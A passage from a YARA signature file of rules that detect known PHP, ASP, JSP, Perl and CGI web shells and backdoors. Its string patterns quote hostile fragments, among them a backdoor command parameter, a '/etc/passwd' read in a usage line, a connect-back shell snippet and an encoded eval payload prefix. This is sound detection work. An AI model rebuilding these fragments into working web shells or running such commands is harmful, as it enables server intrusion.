		id = "62aa783b-f12f-5bb5-9d96-7aee1666788b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3938-L3950"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0b53b67bb3b004a8681e1458dd1895d0"
		logic_hash = "6e6ffc4cad2a956cb2b6667928bac5996cf95cd36f43ba789144c46726471f07"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
		$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
		$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Telnet_Pl
{
	meta:
		description = "Semi-Auto-generated  - file telnet.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "be4de017-e929-5dd3-a60e-f187456b1a55"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3951-L3962"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dd9dba14383064e219e29396e242c1ec"
		logic_hash = "2d1abc52fc70ce664a19e49e6fa4175bc8d8785dee332d5273323479d9628a8c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "W A R N I N G: Private Server"
		$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "

	condition:
		all of them
}

rule SIGNATURE_BASE_W3D_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file w3d.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1a4e3c84-2d3b-5245-bccc-9a5f59b9fc17"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3963-L3975"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "987f66b29bfb209a0b4f097f84f57c3b"
		logic_hash = "33f948a1ae4474daddd788df84fa8baabf4390ec242cad9a6a51dac0152d3b75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "W3D Shell"
		$s1 = "By: Warpboy"
		$s2 = "No Query Executed"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Cgi
{
	meta:
		description = "Semi-Auto-generated  - file WebShell.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b768bb72-64e8-545a-9123-3d5889b58a82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3976-L3987"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "bc486c2e00b5fc3e4e783557a2441e6f"
		logic_hash = "8908ced96284de6b6d5ae693ba54c49a6333bbe5780d951cbacc91b4dde027df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WebShell.cgi"
		$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"

	condition:
		all of them
}

rule SIGNATURE_BASE_Winx_Shell_Html
{
	meta:
		description = "Semi-Auto-generated  - file WinX Shell.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fe02d995-4375-5ce9-aabe-fae5d29278d3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3988-L4000"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
		logic_hash = "4248f807d66990946523ba7b92d795c2c40429182389d9bf3f4a972e246b50c6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WinX Shell"
		$s1 = "Created by greenwood from n57"
		$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Dx_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Dx.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "67d0bccb-d39a-5e30-bdc0-801525ebddd7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4001-L4013"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
		logic_hash = "ab43ddcf317eb4db890ca9750dc6bbc19b06b806339a67c82216df02bc2e8446"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Csh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file csh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4014-L4027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "194a9d3f3eac8bc56d9a7c55c016af96"
		logic_hash = "2a74e06a9fd59d7a577041b49403738904239fb011f9bfe2fb665165991b9c98"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ".::[c0derz]::. web-shell"
		$s1 = "http://c0derz.org.ua"
		$s2 = "vint21h@c0derz.org.ua"
		$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpinj_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7bf54ef4-a3d8-51c6-8db7-bf8947e992ed"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4028-L4040"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d7a4b0df45d34888d5a09f745e85733f"
		logic_hash = "5d39fd31cdaae7765267ce8a35a2fdcf86e7f0de40d4f303fb0f219c0fc04e40"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "News Remote PHP Shell Injection"
		$s3 = "Php Shell <br />" fullword
		$s4 = "<input type = \"text\" name = \"url\" value = \""

	condition:
		2 of them
}

rule SIGNATURE_BASE_Sig_2008_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file 2008.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "bfa3caa9-70a5-536b-a887-58427eee43df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4041-L4054"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3e4ba470d4c38765e4b16ed930facf2c"
		logic_hash = "a437dc3dc836e93c7a691f7a000c4a4ae574ba95b3a216394ba42538beb9c0f7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Codz by angel(4ngel)"
		$s1 = "Web: http://www.4ngel.net"
		$s2 = "$admin['cookielife'] = 86400;"
		$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Rem_View_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Rem View.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6137434c-89e9-537b-9b26-b56178022b76"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4068-L4080"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
		logic_hash = "bcd5c86e793748ffe0ce4415ee68101e8183e1f97477b49843938d254f08695a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "Welcome to phpRemoteView (RemView)"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Java_Shell_Js
{
	meta:
		description = "Semi-Auto-generated  - file Java Shell.js.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eff52c3a-fc3a-5e80-8da9-786168159ebc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4081-L4093"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
		logic_hash = "f312298ac30ab57b21222a529b1566b9a66909806e4bc88120ac3992cfd3c6fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
		$s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
		$s4 = "public static int DEFAULT_SCROLLBACK = 100"

	condition:
		2 of them
}

rule SIGNATURE_BASE_STNC_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file STNC.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a7167f6-fa62-574f-a37c-3ceadc7f92ec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4094-L4107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2e56cfd5b5014cbbf1c1e3f082531815"
		logic_hash = "b4118dc45ac109bde1cafda24cc103370db57c1993690f450cff828c1633af3c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "drmist.ru" fullword
		$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
		$s2 = "STNC WebShell"
		$s3 = "http://www.security-teams.net/index.php?showtopic="

	condition:
		1 of them
}

rule SIGNATURE_BASE_Azrailphp_V1_0_Php
{
	meta:
		description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "60152b96-e8d3-5b06-a855-fb64a490742b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4108-L4120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "26b2d3943395682e36da06ed493a3715"
		logic_hash = "4385f294e59b644fe86d8380db4f7926924eb744ad80735b78ef778d2f7e8ae0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "azrailphp"
		$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
		$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Moroccan_Spamers_Ma_Edition_By_Ghost_Php
{
	meta:
		description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "721d6e9f-a237-5462-a8d3-f838d7fda420"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4121-L4133"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d1b7b311a7ffffebf51437d7cd97dc65"
		logic_hash = "e755e4ea467861e5217d532b161bf4c582ff71aa1e4720dfa4b75d6e8d7629d8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ";$sd98=\"john.barker446@gmail.com\""
		$s1 = "print \"Sending mail to $to....... \";"
		$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmdasp_Asp
{
	meta:
		description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "79e0ba85-ed4b-5909-a2fd-9b4125598078"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4147-L4160"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "64f24f09ec6efaa904e2492dffc518b9"
		logic_hash = "95dc25ecd47b43edbd7e7e36966377aa09da769aff2bc1c33a7df87989611bfa"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "CmdAsp.asp"
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s2 = "-- Use a poor man's pipe ... a temp file --"
		$s3 = "maceo @ dogmile.com"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Simple_Backdoor_Php
{
	meta:
		description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5607f501-a750-59be-9595-5ac71ea6f74b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4161-L4173"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
		logic_hash = "e2e98580b59727313de298fab0009704f621b1b6556220d5065118d960f7a068"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Mysql_Shell_Php
{
	meta:
		description = "Semi-Auto-generated  - file mysql_shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e517984b-575c-5ead-a438-9767d2c74099"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4174-L4186"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d42aec2891214cace99b3eb9f3e21a63"
		logic_hash = "dbd825e1056c41efaf80c0495ba7b6cf1c88403b997ea7ac1378512a19f7ed8a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "smkim@popeye.snu.ac.kr"
		$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dive_Shell_1_0___Emperor_Hacking_Team_Php
{
	meta:
		description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d75294a4-a0a7-5c74-bb7a-766db477633c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4187-L4200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1b5102bdc41a7bc439eea8f0010310a5"
		logic_hash = "bd51b625359799178ad3c8e02ba5bb5fca89e6e14769b86dd35c2b8a1049599f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Emperor Hacking TEAM"
		$s1 = "Simshell" fullword
		$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
		$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Asmodeus_V0_1_Pl
{
	meta:
		description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cfd082a8-56fa-54bc-a683-c0052f78e12e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4201-L4214"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0978b672db0657103c79505df69cb4bb"
		logic_hash = "be0130c9d2a5d29e6ef8749b0058c96c2ca1ecb9823fd14a8a2c82978cf3d104"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "[url=http://www.governmentsecurity.org"
		$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
		$s2 = "print \"Asmodeus Perl Remote Shell"
		$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Backup_Php_Often_With_C99Shell
{
	meta:
		description = "Semi-Auto-generated  - file backup.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4215-L4227"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aeee3bae226ad57baf4be8745c3f6094"
		logic_hash = "e27d00ebfbac2565568b9a97552a331db91b4e9aa318febb048937f5c3a1a1ba"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#phpMyAdmin MySQL-Dump" fullword
		$s2 = ";db_connect();header('Content-Type: application/octetstr"
		$s4 = "$data .= \"#Database: $database" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Reader_Asp
{
	meta:
		description = "Semi-Auto-generated  - file Reader.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "70094d24-fa3a-503c-b9b6-294a883fc52c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4228-L4240"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ad1a362e0a24c4475335e3e891a01731"
		logic_hash = "ec0dc3b050d84e852e0c18bd00961f109d3506fa7f2e8656448bd5edd28d9305"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Mehdi & HolyDemon"
		$s2 = "www.infilak."
		$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phpshell17_Php
{
	meta:
		description = "Semi-Auto-generated  - file phpshell17.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea1f657c-2023-50bb-a2ee-33c53ee8fb5e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4241-L4253"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9a928d741d12ea08a624ee9ed5a8c39d"
		logic_hash = "a9306747a5c9756f393c61562ed4a601c75c3a9491ad19a7b7dbae1fbd505e9a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
		$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
		$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Myshell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file myshell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4254-L4266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "62783d1db52d05b1b6ae2403a7044490"
		logic_hash = "dd7b0fa637a8317986de0c2312b4b552f1110fb5a64590a9a21c854e5985fbb6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
		$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
		$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Jspshall_Jsp
{
	meta:
		description = "Semi-Auto-generated  - file jspshall.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4bccad33-d26e-52c2-b7f8-802f2c8f3889"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4281-L4293"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"
		logic_hash = "94c458d3f38ba21348b0202e2b81bbbc3859e97d64f101a9ea7ec6f036e38bc5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "kj021320"
		$s1 = "case 'T':systemTools(out);break;"
		$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php
{
	meta:
		description = "Semi-Auto-generated  - file webshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4294-L4305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e425241b928e992bde43dd65180a4894"
		logic_hash = "7b0f4f4afde7dcb44c9d877a72c961f3666278ce28a24ae8068cfbc32639e307"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
		$s3 = "PHP Web Shell"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rootshell_Php
{
	meta:
		description = "Semi-Auto-generated  - file rootshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aec6621e-f23a-5f9f-91f1-d2f1b1ab58d0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4306-L4319"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "265f3319075536030e59ba2f9ef3eac6"
		logic_hash = "f836dd1825dc84212d32a034c0dde45d60ccd1eb667018abb60d671b61192666"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "shells.dl.am"
		$s1 = "This server has been infected by $owner"
		$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
		$s4 = "Could not write to file! (Maybe you didn't enter any text?)"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Connectback2_Pl
{
	meta:
		description = "Semi-Auto-generated  - file connectback2.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ddebc62-17d2-577e-84bd-207367078327"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4320-L4332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "473b7d226ea6ebaacc24504bd740822e"
		logic_hash = "7316c93f12dbbf6d0235601d8be88c199e37955507925222d00041d0ceaf01c7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
		$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
		$s2 = "ConnectBack Backdoor"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Defacekeeper_0_2_Php
{
	meta:
		description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "671323e2-42cb-5ce0-9839-5d01c446471c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4333-L4345"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "713c54c3da3031bc614a8a55dccd7e7f"
		logic_hash = "0ee3fed3441e9561867508e324d7a6b1808a8923513bf1c9b82f8238224c994c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
		$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
		$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shells_PHP_Wso
{
	meta:
		description = "Semi-Auto-generated  - file wso.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fdce6094-a88e-5da6-aeb0-bc97b15bf397"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4346-L4357"
